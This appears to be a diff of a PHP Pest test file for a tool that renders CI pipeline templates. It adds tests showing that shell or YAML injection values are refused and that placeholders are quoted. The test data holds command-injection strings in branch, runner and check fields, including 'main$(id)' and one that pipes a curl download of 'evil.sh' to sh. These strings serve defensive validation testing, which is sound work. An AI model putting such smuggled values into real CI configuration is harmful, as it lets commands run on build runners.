@@ -42,23 +42,32 @@ function ciTemplateJson(string $yaml): string
  * The gate as Composer lists it installed from a commit of its main branch, the one
  * tests/Fixtures/CiTemplates/installed.json names: the snapshots pin it, and a pin must name a real commit.
  */
-$gate = static function (): GatePin {
+function ciTemplateGate(): GatePin
+{
     $installed = Installed::decode(
         Contents::of((string) file_get_contents(Schema::at('tests/Fixtures/CiTemplates/installed.json'))),
         Path::of('vendor/composer/installed.json'),
     );
 
     return $installed instanceof Installed ? GatePin::in($installed) : GatePin::unknown();
-};
+}
 
-/** A template, filled in as a project on PHP 8.5, with the default branch trunk and the runner pest, fills it in. */
-$rendered = static fn(CiTemplate $template): string => TemplateValues::of(
-    '8.5',
-    'trunk',
-    $gate(),
-    'pest',
-    '.gitlab/mutation-gate.yml',
-)->rendered((string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value))));
+/** A template, as a project on PHP 8.5, with the default branch trunk, the runner pest and every default, fills it in. */
+function ciTemplateRendered(CiTemplate $template): string
+{
+    $values = TemplateValues::of(
+        '8.5',
+        'trunk',
+        ciTemplateGate(),
+        'pest',
+        Ci::none()->gitlabTemplate()->value(),
+        Ci::none()->check(),
+        CiTemplate::buildkitePipeline()->value(),
+    );
+    $text = (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value)));
+
+    return $values instanceof TemplateValues ? $values->rendered($text) : throw new LogicException($values->why());
+}
 
 it('renders each CI\'s templates, the GitHub one as the estimate or the request picks it', function (): void {
     $single = GitHubWorkflow::Single;
@@ -69,9 +78,7 @@ it('renders each CI\'s templates, the GitHub one as the estimate or the request 
         ->and(CiTemplate::for(BuiltinCiPlan::Buildkite, $single))
         ->toEqual(Listed::of(CiTemplate::BuildkitePipeline, CiTemplate::BuildkiteUpload))
         ->and(CiTemplate::for(BuiltinCiPlan::CircleCi, $single))->toEqual(Listed::of(CiTemplate::CircleCi))
-        ->and(CiTemplate::for(BuiltinCiPlan::Json, $single))->toEqual(CannotJudge::because(
-            'init --ci writes a definition for github, gitlab, buildkite or circleci, not json.',
-        ));
+        ->and(CiTemplate::for(BuiltinCiPlan::Json, $single))->toEqual(Listed::of());
 });
 
 it('writes a definition to a file of its own, and prints one that belongs in a file the CI reads', function (): void {
@@ -95,8 +102,8 @@ it('writes a definition to a file of its own, and prints one that belongs in a f
 
 it('fills in every placeholder, and renders YAML the provider\'s published schema accepts', function (
     CiTemplate $template,
-) use ($rendered): void {
-    $text = $rendered($template);
+): void {
+    $text = ciTemplateRendered($template);
     [$provider] = explode('/', $template->value);
     $schema = Schema::at(sprintf('tests/Fixtures/CiSchemas/%s.json', CI_SCHEMAS[$provider]));
 
@@ -104,8 +111,8 @@ it('fills in every placeholder, and renders YAML the provider\'s published schem
         ->and(Schema::errors(ciTemplateJson($text), $schema))->toBe([]);
 })->with(CiTemplate::cases());
 
-it('renders each template as its snapshot', function (CiTemplate $template) use ($rendered): void {
-    expect($rendered($template))->toBe((string) file_get_contents(Schema::at(sprintf('tests/Fixtures/CiTemplates/%s', $template->value))));
+it('renders each template as its snapshot', function (CiTemplate $template): void {
+    expect(ciTemplateRendered($template))->toBe((string) file_get_contents(Schema::at(sprintf('tests/Fixtures/CiTemplates/%s', $template->value))));
 })->with(CiTemplate::cases());
 
 it('pins each action a template uses by the commit the package\'s own workflows use, and the gate by its own', function (
@@ -134,3 +141,44 @@ it('pins each action a template uses by the commit the package\'s own workflows 
         expect($pins[$action] ?? 'not used by the package\'s workflows')->toBe($pin);
     }
 })->with(CiTemplate::cases());
+
+it('refuses a value a shell or YAML would read as code, from whichever setting it comes', function (
+    string $branch,
+    string $runner,
+    string $template,
+    string $check,
+    string $why,
+): void {
+    expect(TemplateValues::of('8.5', $branch, GatePin::unknown(), $runner, $template, $check, 'x.yml'))
+        ->toEqual(CannotJudge::because(sprintf(
+            '%s cannot go into a CI definition, where a shell or YAML reads it as code. %s',
+            ...explode(' | ', $why),
+        )));
+})->with([
+    'a command in the branch' => ['main$(id)', 'pest', 'x.yml', 'c', 'The default branch "main$(id)" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
+    'a command chained after the branch' => ['x;curl${IFS}evil.sh|sh', 'pest', 'x.yml', 'c', 'The default branch "x;curl${IFS}evil.sh|sh" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
+    'a quote in the branch' => ["it's", 'pest', 'x.yml', 'c', 'The default branch "it\'s" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
+    'backticks in the branch' => ['a`id`', 'pest', 'x.yml', 'c', 'The default branch "a`id`" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
+    'a quote in the runner' => ['main', "pest'", 'x.yml', 'c', 'The runner "pest\'" | Choose a runner by a name of letters, digits and ._-.'],
+    'a quote in the template' => ['main', 'pest', "a'b.yml", 'c', 'The file "a\'b.yml" | Set ci.gitlab.template to a path of letters, digits and ._/-.'],
+    'a command in the check' => ['main', 'pest', 'x.yml', 'x$(id)', 'The check "x$(id)" | Set ci.check to a name of letters, digits, spaces and ._/-.'],
+]);
+
+it('takes a runner a class names, and a check with spaces', function (): void {
+    expect(TemplateValues::of('8.5', 'release/2.x', GatePin::unknown(), '\\Acme\\Runner', 'ci/gate.yml', 'mutation / verdict', 'x.yml'))
+        ->toBeInstanceOf(TemplateValues::class);
+});
+
+it('quotes every value a project gives wherever a template holds it, and runs none in a shell line', function (
+    CiTemplate $template,
+): void {
+    $lines = explode("\n", (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value))));
+    $unquoted = array_filter($lines, static fn(string $line): bool => ! str_starts_with(trim($line), '#')
+        && preg_match("/(?<!')%%(branch|runner|template|check)%%|%%(branch|runner|template|check)%%(?!')/", $line) === 1);
+
+    expect(array_values($unquoted))->toBe([]);
+})->with(CiTemplate::cases());
+
+it('names the one-step action\'s job for the check the verdict reports under', function (): void {
+    expect(ciTemplateRendered(CiTemplate::GitHubSingle))->toContain(sprintf("    name: '%s'\n", Ci::none()->check()));
+});
